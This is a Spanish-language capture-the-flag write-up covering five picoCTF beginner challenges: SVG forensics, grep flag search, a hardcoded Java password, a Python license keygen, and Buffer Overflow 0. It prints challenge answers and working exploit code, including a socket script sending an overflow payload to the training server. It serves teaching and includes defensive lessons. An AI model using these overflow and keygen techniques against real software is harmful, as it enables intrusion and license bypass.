---
description: >-
  Quinta y última sección de la playlist para principiantes de picoCTF.  
  Forense, Ingeniería Inversa y Binary Exploitation. ¡Puro hacking!
---

# 🔍 Section 5 (Analisis y Explotacion)

{% hint style="info" %}
Esta última sección cubre tres áreas que pueden intimidar al principio, pero que con práctica se vuelven adictivas. Como siempre: **siempre hackeando, nunca webiando.** 😤
{% endhint %}

***

## 🚩 Enhance!

<details>

<summary><strong>Categoría:</strong> 🔎 Forense</summary>

**Dificultad:** 🟡 **Medio**

El reto nos da una imagen y debemos encontrar la flag dentro. el huesaso xd , No exactamente. 😄

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

### 🪄 El truco del SVG

El archivo tiene extensión `.svg` — y aquí está el detalle clave: **un SVG no es una imagen tradicional como un PNG o JPG**. Es un archivo de texto basado en XML. Básicamente es código disfrazado de imagen.

Lo abrimos con <kbd>cat</kbd> o directamente en el navegador y vemos el código XML. La flag aparece dispersa entre las etiquetas del archivo, por lo que necesitamos extraerla y unirla.

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### 💻 Comando para extraer la flag

```bash
grep -oE 'id="tspan[0-9]+">[^<]+' archivo.svg | sed 's/id="tspan[0-9]*">//' | tr -d '\n' | sed 's/ //g'
```

### 🧩 Desglose del comando

| Parte                               | Función                                                  |
| ----------------------------------- | -------------------------------------------------------- |
| `grep -oE 'id="tspan[0-9]+">[^<]+'` | Extrae el contenido de cada etiqueta `<tspan>`           |
| `-o`                                | Muestra solo la parte que coincide, no la línea completa |
| `-E`                                | Activa expresiones regulares extendidas                  |
| `sed 's/id="tspan[0-9]*">//'`       | Elimina la parte `id="tspanXXXX">` de cada línea         |
| `tr -d '\n'`                        | Une todo en una sola línea eliminando saltos             |
| `sed 's/ //g'`                      | Elimina espacios — dejando la flag limpia                |

{% hint style="warning" %}
**Dato interesante:** los SVG pueden contener código JavaScript oculto, lo que los hace un vector real de ataque en campañas de phishing. Este reto lo demuestra perfectamente — lo que parece una imagen, es código. 😬
{% endhint %}

</details>

***

## 🚩 Big Zip

<details>

<summary><strong>Categoría:</strong> 🔎 General Skills</summary>

**Dificultad:**  🟢 **Facil**

El reto nos da un directorio lleno de archivos de texto. Buscar la flag manualmente sería una locura — aquí `grep` es nuestro mejor amigo. 🧠

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

### 💻 Comando utilizado

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

```bash
grep -r --include="*.txt" -E "picoCTF{.*}" .
```

### 🧩 Desglose del comando

| Flag                | Función                                                                 |
| ------------------- | ----------------------------------------------------------------------- |
| `-r`                | Busca recursivamente en todos los subdirectorios                        |
| `--include="*.txt"` | Filtra solo archivos con extensión `.txt`, ignorando `.py`, `.sh`, etc. |
| `-E`                | Activa expresiones regulares extendidas                                 |
| `"picoCTF{.*}"`     | Patrón que captura la flag completa incluyendo su contenido             |
| `.`                 | Directorio actual como punto de partida                                 |

Si quisieras buscar en múltiples extensiones a la vez:

```bash
grep -r --include="*.txt" --include="*.log" -E "picoCTF{.*}" .
```

{% hint style="info" %}
**Nota:** `-E` no es estrictamente necesario para buscar texto literal como `picoCTF`, pero sí lo es cuando usas patrones como `picoCTF{.*}` para capturar la flag completa. Si solo buscas texto fijo sin regex, puedes usar `-F` que es más rápido. 🚀
{% endhint %}



</details>

***

## 🚩 Vault Door Training

<details>

<summary><strong>Categoría:</strong> ⚙️ Ingeniería Inversa / Java</summary>

**Dificultad: Facil**

El reto nos da el código fuente de un programa en Java que pide una contraseña. La misión: encontrarla y obtener "Access granted".

<figure><img src="../../.gitbook/assets/image (83).png" alt="" width="563"><figcaption></figcaption></figure>

### 🕵️‍♂️ Análisis del código

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

El programa hace lo siguiente:

1. 🙋‍♂️ Pide al usuario que ingrese una contraseña.
2. ✂️ Extrae el texto entre `picoCTF{` y `}` usando `.substring()`.
3. ⚖️ Compara el resultado con la contraseña hardcodeada en `checkPassword()`.

```java
public boolean checkPassword(String password) {
    return password.equals("w4rm1ng_Up_w1tH_jAv4_000uMfhzBuS");
}
```

La contraseña está **en texto plano dentro del código** — el propio comentario del desarrollador nos da el aviso:

```java
// The password is below. Is it safe to put the password in the source code?
// -Minion #9567
```

Spoiler: no. No es seguro. 😅

### 🛠️ Solución

No hace falta compilar ni ejecutar nada. La flag completa se construye así:

```
picoCTF{w4rm1ng_Up_w1tH_jAv4_000uMfhzBuS}
```

Si quisieras ejecutarlo igualmente:

```bash
javac VaultDoorTraining.java
java VaultDoorTraining
# Enter vault password: picoCTF{w4rm1ng_Up_w1tH_jAv4_000uMfhzBuS}
# Access granted.
```

{% hint style="info" %}
**Lección aprendida:** Nunca guardes contraseñas en el código fuente de forma visible. En un entorno real, esto se llama _hardcoded credentials_ y es una vulnerabilidad crítica. El _source code analysis_ es siempre el primer paso en cualquier reto de reversing. 🤓
{% endhint %}



</details>

***

## 🚩 Keygenme-py

<details>

<summary><strong>Categoría:</strong> ⚙️ Ingeniería Inversa / Python</summary>

**Dificultad:**  🔴 **Media-Alta**

Se nos da un programa Python que actúa como una calculadora con licencia. Para obtener la flag debemos encontrar la **license key** correcta.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### 🕵️‍♂️ Análisis del código

Al inicio del programa encontramos tres variables clave:

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

```python
key_part_static1_trial  = "picoCTF{1n_7h3_kk3y_of_"
key_part_dynamic1_trial = "xxxxxxxx"   # 8 caracteres desconocidos
key_part_static2_trial  = "}"
```

La licencia completa es la concatenación de las tres partes. Las estáticas ya las tenemos — el reto es encontrar los **8 caracteres dinámicos**.

### 🔍 Función check\_key()

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

La función verifica cada carácter dinámico contra posiciones específicas del SHA256 del username `"BENNETT"`:

```python
if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
```

Los índices usados en orden son: `[4, 5, 3, 6, 2, 7, 1, 8]`

### 💥 Exploit

```python
import hashlib

result_hash = hashlib.sha256(b"BENNETT").hexdigest()
indices = [4, 5, 3, 6, 2, 7, 1, 8]

dinamico = "".join([result_hash[i] for i in indices])
flag = "picoCTF{1n_7h3_kk3y_of_" + dinamico + "}"
print(flag)
```

{% hint style="info" %}
**Lección aprendida:** Siempre mapea todas las variables globales al inicio del código antes de analizar la lógica. Los datos clave suelen estar declarados ahí y es fácil pasarlos por alto — como casi me pasó en este reto. 😅
{% endhint %}

</details>

***

## 🚩 Buffer Overflow 0

<details>

<summary><strong>Categoría:</strong> 💥 Binary Exploitation</summary>

**Dificultad:**  🔴 **Medio-Alta**

Se nos provee un binario, su código fuente en C y un servidor al que conectarse por `nc`. El objetivo: provocar un crash controlado para obtener la flag.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Nota:** El binario ejecutable sirve para practicar localmente. Para usarlo debes crear un `flag.txt` con contenido de prueba en el mismo directorio — el código lo requiere para arrancar. La flag real está en el servidor. 🌐
{% endhint %}

### ❓ ¿Por qué nos dan tres cosas?

| Recurso                   | Para qué sirve                                              |
| ------------------------- | ----------------------------------------------------------- |
| 📦 **Binario**            | Practicar el exploit localmente antes de atacar el servidor |
| 📜 **Código fuente `.c`** | Leer la vulnerabilidad sin hacer reversing                  |
| 🌐 **Host `nc`**          | El servidor real con la flag verdadera                      |

### 🕵️‍♂️ Análisis del código fuente

Dos funciones peligrosas saltan a la vista:

```c
char buf1[100];
gets(buf1);          // acepta input sin límite ← VULNERABLE

void vuln(char *input){
    char buf2[16];
    strcpy(buf2, input);  // copia sin verificar tamaño ← VULNERABLE
}
```

`gets()` acepta cualquier cantidad de caracteres y `strcpy()` los copia en un buffer de solo **16 bytes**. Si mandamos más de 16 caracteres, los bytes extra desbordan la memoria adyacente — eso es un **Buffer Overflow**. 🌊

### 🎯 El truco del SIGSEGV

```c
void sigsegv_handler(int sig) {
    printf("%s\n", flag);  // imprime la flag al crashear
}
signal(SIGSEGV, sigsegv_handler);
```

`SIGSEGV` es la señal que lanza el sistema cuando un programa accede a memoria inválida. El programa está diseñado para **imprimir la flag justo cuando crashea**. Hermoso caos controlado. 😄🔥

### 🌊 Flujo del exploit

```
Input enorme → buf2[16] se desborda → memoria inválida → SIGSEGV → flag impresa 🎉
```

### 🔨 Explotación manual

La forma más simple: conectarse por `nc` y escribir más de 16 caracteres cuando pide input.

```bash
nc saturn.picoctf.net 51968
# Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### 🐍 Exploit automatizado en Python

Para tenerlo automatizado y que se vea más pro: 😎

```python
import socket   # librería para conexiones de red (hablar con servidores)
import time     # para manejar tiempos/esperas

# dirección del servidor (CTF típico)
host = "saturn.picoctf.net"
puerto = 51968

# payload = lo que vas a mandar al servidor
# b"A" * 200 → 200 letras A en formato bytes
# b"\n" → salto de línea (como presionar ENTER)
payload = b"A" * 200 + b"\n"

# crear socket (tipo IPv4 + TCP)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# conectarse al servidor (como abrir conexión)
s.connect((host, puerto))

# recibir datos del servidor (máx 1024 bytes)
data = s.recv(1024)

# imprimir lo que manda el servidor
# decode → convierte bytes a texto
# errors='replace' → si hay errores, los reemplaza
print("servidor:", data.decode(errors='replace'))

# enviar el payload (las 200 A)
s.send(payload)

# esperar 1 segundo (para que el server procese)
time.sleep(1)

# recibir respuesta del servidor
respuesta = s.recv(1024)

# imprimir posible flag 👀
print("flag:", respuesta.decode(errors='replace'))

# cerrar conexión
s.close()
```

{% hint style="warning" %}
**Lección aprendida:** `gets()` y `strcpy()` son funciones peligrosas en C porque no verifican el tamaño del input. En código real nunca deben usarse — las alternativas seguras son `fgets()` y `strncpy()`. 🛡️
{% endhint %}



</details>

***

## 🖤 Cierre

{% hint style="info" %}
Con esto terminamos la lista de retos de principiantes en **picoCTF Gym**. A lo largo de este recorrido tocamos todas las categorías principales: General Skills, Criptografía, Web, Python, Forense, Reversing y Binary Exploitation.

Estos retos son el punto de partida — dentro de la plataforma hay mucho más con niveles de dificultad progresivos para seguir aprendiendo. La idea es nunca parar. 🚀

No olvides: **siempre diviértete hackeando.** 🔥
{% endhint %}

```
Happy H4ck1ng
spoonki .. siempre hackeando nunca webiando
```
